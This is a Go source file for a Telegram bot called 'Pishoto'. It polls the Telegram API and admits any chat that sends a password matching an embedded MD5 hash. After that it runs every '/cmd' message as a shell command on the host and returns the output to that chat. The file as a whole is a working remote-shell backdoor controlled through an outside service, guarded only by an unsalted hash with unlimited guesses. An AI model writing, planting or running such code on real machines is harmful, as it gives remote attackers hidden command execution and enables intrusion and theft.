package main

import (
	_ "embed"
	"io"
	"fmt"
	"log"
	"bytes"
	"strconv"
	"strings"
	"os/exec"
	"net/http"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
)

var (
	//go:embed pass_md5
	passMd5 string
	//go:embed bot_token
	botToken string
	chatIDs  []int64
	baseURL  = "https://api.telegram.org/bot" + botToken + "/"
)

// Message structure to handle Telegram API messages
type Message struct {
	Chat Chat   `json:"chat"`
	Text string `json:"text"`
}

// Chat structure to hold chat information
type Chat struct {
	ID int64 `json:"id"`
}

// Update structure to handle updates from the Telegram API
type Update struct {
	UpdateID int     `json:"update_id"`
	Message  Message `json:"message"`
}

// Response structure to parse the JSON response from Telegram API
type Response struct {
	OK     bool     `json:"ok"`
	Result []Update `json:"result"`
}

func md5Hash(text string) string {
	// Create a new MD5 hash object
	hash := md5.New()

	// Write the string data to the hash object
	hash.Write([]byte(text))

	// Compute the MD5 checksum
	checksum := hash.Sum(nil)

	// Convert the checksum to a hexadecimal string
	return hex.EncodeToString(checksum)
}

func contains[T comparable](slice []T, item T) bool {
	for _, v := range slice {
		if v == item {
			return true
		}
	}
	return false
}

func SendMessage(chatID int64, text string) error {
	url := baseURL + "sendMessage"
	payload := map[string]interface{}{
		"chat_id": chatID,
		"text":    text,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	_ = body
	// log.Printf("SendMessage Response: %s", body)

	return nil
}

func GetUpdates(offset int) (Response, error) {
	url := baseURL + "getUpdates?offset=" + strconv.Itoa(offset)
	resp, err := http.Get(url)
	if err != nil {
		return Response{}, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return Response{}, err
	}

	var response Response
	err = json.Unmarshal(body, &response)
	if err != nil {
		return Response{}, err
	}

	return response, nil
}

func executeCommand(commandParts []string) string {

	// Execute the command using the first element as the command and the rest as arguments
	cmd := exec.Command(commandParts[0], commandParts[1:]...)

	// Get the combined output (stdout + stderr)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}

	// Return the output as a string
	return string(output)
}

func parseCommand(text string, chatID int64) {
	commandParts := strings.Split(text, " ")
	commandType := commandParts[0]
	switch commandType {
	case "/cmd":
		output := executeCommand(commandParts[1:])
		SendMessage(chatID, output)
	}
}

func main() {
	fmt.Println("Bot started. Press Ctrl+C to stop.")
	offset := 0

	for {
		updates, err := GetUpdates(offset)
		if err != nil {
			log.Fatalf("Error fetching updates: %v", err)
		}

		for _, update := range updates.Result {
			offset = update.UpdateID + 1
			chatID := update.Message.Chat.ID
			text := update.Message.Text
			if contains(chatIDs, chatID) {
				parseCommand(text, chatID)
			} else if md5Hash(text) == passMd5 {
				fmt.Println("Password answered in Chat ID:", chatID)
				chatIDs = append(chatIDs, chatID)
				responseText := "Password confirmed. Pishoto is welcoming you :)"
				err := SendMessage(chatID, responseText)
				if err != nil {
					log.Fatalf("Error sending message: %v", err)
				}
			} else {
				responseText := "Wrong password."
				SendMessage(chatID, responseText)
			}
		}
	}
}
